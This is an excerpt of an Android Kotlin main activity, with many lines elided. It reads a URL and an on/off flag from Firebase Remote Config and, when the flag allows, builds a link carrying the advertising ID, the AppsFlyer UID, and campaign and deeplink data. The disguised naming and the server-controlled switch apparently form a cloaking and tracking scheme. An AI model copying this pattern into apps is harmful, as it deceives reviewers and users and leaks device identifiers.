...
//import com.google.firebase.remoteconfig.ktx.remoteConfig
//import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.vurda.start.databinding.ActivityMainBinding
import com.vurda.start.util.*
import com.vurda.start.util.manager.DataStoreManager
import com.vurda.start.util.network.internetConnection
                    ...
                    startFragmentIdFlow.collect { fragmentId ->
                        requestedOrientation = when (fragmentId) {
                            ...
                            binding.root.also { rootCL ->
                                ConstraintSet().apply {
                                    clone(rootCL)
                                    constrainPercentHeight(binding.loader.id, .01f)
...
//    }
                        ...
                        Firebase.remoteConfig.apply {
                            ...
                            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                                if (task.isSuccessful) {
                                    val jsonStr = getString("Pen")
                                    log("success = $jsonStr")
                                    JSONObject(jsonStr).also { jsonObj ->
                                        coroutine.launch(Dispatchers.IO) {
                                            getPiterParker(jsonObj.getString("ready"), jsonObj.getBoolean("war"))
                                        }
                                    }
    ...
    private suspend fun getPiterParker(ready: String, war: Boolean) {
        if (war.not()) {
            withContext(Dispatchers.Main) {
                val completer = Completer(coroutine, 2) {
                    ...
                    val sosalka = ready + "?" +
                            "adrequaiment=${advertisingId}&" +
                            "af_fu_hu_yak=${appsflyerUID}&" +
                            "cmbinat=${AppsflyerUtil.campaignFlow.value}&" +
                            "eto_dip_dance=${FacebookUtil.deeplinkFlow.value}"
                    ...
                    coroutine.launch(Dispatchers.IO) {
                        ...
                        DataStoreManager.Link.update { sosalka }
                    }
                }
